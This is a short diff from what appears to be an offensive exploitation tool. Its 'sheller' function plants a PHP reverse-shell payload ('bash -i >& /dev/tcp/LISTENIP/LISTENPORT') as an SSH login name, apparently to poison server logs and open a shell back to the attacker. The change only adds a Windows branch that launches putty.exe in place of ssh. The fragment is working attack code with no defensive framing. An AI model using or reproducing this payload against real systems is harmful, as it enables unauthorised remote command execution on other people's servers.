@@ -651,7 +651,10 @@ def sheller(technique, attack, url, url2, keyword, cookie, selected, verbose, pa
             '<?php passthru("bash -i >& /dev/tcp/{}/{} 0>&1"); ?>@{}'.format(LISTENIP, LISTENPORT, host)]
             for ssh in sshs:
                 try:
-                    subprocess.call(["ssh", ssh])
+                    if sys.platform.lower().startswith("win"):
+                        subprocess.run(["putty.exe", "-ssh", ssh])
+                    else:
+                        subprocess.run(["ssh", ssh])
                 except Exception as e:
                     print("Technique " + technique + " failed: {}".format(e))
             try:
